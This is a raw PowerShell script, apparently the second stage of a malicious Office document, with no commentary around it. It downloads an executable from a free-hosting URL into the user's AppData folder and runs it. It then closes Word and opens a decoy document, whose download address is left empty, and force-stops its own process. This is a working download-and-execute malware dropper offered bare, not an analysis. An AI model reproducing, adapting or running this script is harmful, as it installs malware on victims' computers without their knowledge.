$file = $env:APPDATA + '\KGC.exe';$nwPath = $env:APPDATA + '\D7T.doc';If (test-path $file) {Remove-Item $file} If (test-path $nwPath) {Remove-Item $nwPath} $coma = New-Object System.Net.WebClient; $coma.Headers['User-Agent'] = 'who-nop'; $coma.DownloadFile('https://kemmetal-company.000webhostapp.com/better/daluuuuuu.exe', $file); $coma.DownloadFile('', $nwPath); (New-Object -com Shell.Application).ShellExecute($file); Stop-Process -processname WINWORD;Start-Process -FilePath $nwPath;Stop-Process -Id $Pid -Forcee
